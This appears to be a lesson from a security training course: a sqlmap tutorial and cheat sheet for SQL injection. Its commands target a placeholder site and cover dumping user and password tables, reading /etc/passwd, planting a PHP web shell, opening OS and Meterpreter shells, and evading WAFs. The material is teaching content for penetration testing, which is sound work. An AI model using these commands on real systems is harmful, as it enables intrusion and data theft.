# Automated Tools (sqlmap)

## Unit 5: SQL Injection — Topic 6

## 🎯 Overview

sqlmap is the industry-standard automated SQL injection detection and exploitation tool. It supports all major database engines, injection techniques, and can automate everything from detection to data extraction and OS command execution. This topic covers sqlmap's capabilities, usage patterns, and advanced features.

---

## 1. sqlmap Basics

```bash
# Basic scan
sqlmap -u "https://target.com/page?id=1"

# POST request
sqlmap -u "https://target.com/login" \
  --data="username=admin&password=test"

# Specify parameter to test
sqlmap -u "https://target.com/page?id=1&name=test" -p "id"

# Use saved request from Burp
# Save request to file (right-click → Save Item)
sqlmap -r request.txt

# With cookies
sqlmap -u "https://target.com/page?id=1" \
  --cookie="session=abc123; role=user"

# With custom headers
sqlmap -u "https://target.com/page?id=1" \
  --headers="Authorization: Bearer eyJ...\nX-Custom: value"
```

---

## 2. Detection Options

```bash
# Increase detection sensitivity
sqlmap -u "https://target.com/page?id=1" \
  --level=5 --risk=3

# Level (1-5): tests more injection points
# Level 1: GET/POST params (default)
# Level 2: + Cookie headers
# Level 3: + User-Agent, Referer headers
# Level 4: + more payloads
# Level 5: + all headers, more edge cases

# Risk (1-3): uses more aggressive payloads
# Risk 1: Default (safe payloads)
# Risk 2: + heavy time-based queries
# Risk 3: + OR-based payloads (may modify data!)

# Specify injection technique
sqlmap -u "https://target.com/page?id=1" \
  --technique=BEUST
# B = Boolean-based blind
# E = Error-based
# U = Union-based
# S = Stacked queries
# T = Time-based blind

# Batch mode (auto-answer prompts)
sqlmap -u "https://target.com/page?id=1" --batch
```

---

## 3. Enumeration Commands

```bash
# Database fingerprint
sqlmap -u "https://target.com/page?id=1" --banner

# List databases
sqlmap -u "https://target.com/page?id=1" --dbs

# List tables in a database
sqlmap -u "https://target.com/page?id=1" -D webapp --tables

# List columns in a table
sqlmap -u "https://target.com/page?id=1" -D webapp -T users --columns

# Dump table data
sqlmap -u "https://target.com/page?id=1" -D webapp -T users --dump

# Dump specific columns
sqlmap -u "https://target.com/page?id=1" -D webapp -T users \
  -C "username,password" --dump

# Dump all databases
sqlmap -u "https://target.com/page?id=1" --dump-all

# Current user and privileges
sqlmap -u "https://target.com/page?id=1" --current-user --privileges

# List database users
sqlmap -u "https://target.com/page?id=1" --users --passwords
```

---

## 4. Advanced Features

### File System Access

```bash
# Read a file
sqlmap -u "https://target.com/page?id=1" \
  --file-read="/etc/passwd"

# Write a file (web shell)
sqlmap -u "https://target.com/page?id=1" \
  --file-write="shell.php" \
  --file-dest="/var/www/html/shell.php"
```

### OS Command Execution

```bash
# Interactive OS shell
sqlmap -u "https://target.com/page?id=1" --os-shell

# Execute specific command
sqlmap -u "https://target.com/page?id=1" --os-cmd="whoami"

# SQL shell (execute arbitrary SQL)
sqlmap -u "https://target.com/page?id=1" --sql-shell

# Meterpreter/VNC session
sqlmap -u "https://target.com/page?id=1" --os-pwn
```

### WAF Bypass

```bash
# Tamper scripts (modify payloads to bypass WAF)
sqlmap -u "https://target.com/page?id=1" \
  --tamper=space2comment

# Common tamper scripts:
# space2comment     - Replace spaces with /**/
# between           - Replace > with BETWEEN
# randomcase        - Random upper/lowercase
# charencode        - URL encode characters
# equaltolike       - Replace = with LIKE
# space2hash        - Replace spaces with # + newline
# apostrophemask    - UTF-8 encode apostrophes

# Chain multiple tamper scripts
sqlmap -u "https://target.com/page?id=1" \
  --tamper=space2comment,randomcase,between

# With random User-Agent
sqlmap -u "https://target.com/page?id=1" --random-agent

# With delay between requests
sqlmap -u "https://target.com/page?id=1" --delay=2

# Through proxy (Burp Suite)
sqlmap -u "https://target.com/page?id=1" \
  --proxy="http://127.0.0.1:8080"
```

---

## 5. sqlmap with Different Input Types

```bash
# JSON body
sqlmap -u "https://target.com/api/search" \
  --data='{"query":"test","limit":10}' \
  --content-type="application/json"

# From Burp saved request
sqlmap -r burp_request.txt --batch

# Testing headers
sqlmap -u "https://target.com/" \
  --headers="X-Forwarded-For: 1*" --batch
# The * marks the injection point

# Testing cookies
sqlmap -u "https://target.com/dashboard" \
  --cookie="user_id=1*" --batch
```

---

## 6. Performance Optimization

```bash
# Multi-threaded (faster)
sqlmap -u "https://target.com/page?id=1" --threads=10

# Only test specific DBMS
sqlmap -u "https://target.com/page?id=1" --dbms=mysql

# Skip testing specific params
sqlmap -u "https://target.com/page?id=1&safe=2" \
  --skip="safe"

# Use specific technique only
sqlmap -u "https://target.com/page?id=1" --technique=U

# Limit output
sqlmap -u "https://target.com/page?id=1" -D webapp -T users \
  --dump --start=1 --stop=10  # First 10 rows

# Continue from previous session
sqlmap -u "https://target.com/page?id=1" --dump \
  --resume
```

---

## 7. sqlmap Cheat Sheet

```
┌──────────────────────────────────────────────────────────────┐
│              SQLMAP QUICK REFERENCE                           │
├──────────────────────────────────────────────────────────────┤
│                                                              │
│  Detection:     -u URL --batch --level=3 --risk=2           │
│  Databases:     --dbs                                        │
│  Tables:        -D dbname --tables                           │
│  Columns:       -D dbname -T tablename --columns             │
│  Dump:          -D dbname -T tablename --dump                │
│  All data:      --dump-all                                   │
│  File read:     --file-read="/etc/passwd"                    │
│  OS shell:      --os-shell                                   │
│  SQL shell:     --sql-shell                                  │
│  WAF bypass:    --tamper=script1,script2                     │
│  Proxy:         --proxy="http://127.0.0.1:8080"             │
│  From Burp:     -r request.txt                               │
│  Batch mode:    --batch                                      │
└──────────────────────────────────────────────────────────────┘
```

---

## 📊 Summary Table

| Feature | Command | Use Case |
|---------|---------|---------|
| Basic scan | `-u URL` | Initial detection |
| Full scan | `--level=5 --risk=3` | Thorough testing |
| Data dump | `-D db -T table --dump` | Data extraction |
| OS access | `--os-shell` | Post-exploitation |
| WAF bypass | `--tamper=scripts` | Protected targets |
| File read | `--file-read` | System file access |

---

## ❓ Revision Questions

1. What do the --level and --risk parameters control in sqlmap?
2. How do you use sqlmap with a Burp Suite saved request?
3. What tamper scripts help bypass WAF protections?
4. How does sqlmap achieve OS command execution?
5. What is the difference between --os-shell and --sql-shell?
6. How do you optimize sqlmap for faster data extraction?

---

*Previous: [05-authentication-bypass.md](05-authentication-bypass.md) | Next: [07-prevention-techniques.md](07-prevention-techniques.md)*

---

*[Back to README](../README.md)*
